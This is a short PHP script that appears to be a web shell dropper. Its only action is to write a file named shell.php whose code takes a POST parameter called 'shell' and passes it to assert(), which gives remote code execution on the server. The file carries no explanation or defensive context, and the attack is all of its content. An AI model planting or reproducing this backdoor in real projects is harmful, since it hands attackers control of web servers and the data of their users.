<?php
$test='<?php $a=$_POST["shell"];assert($a); ?>';
file_put_contents("shell.php", $test);
?>
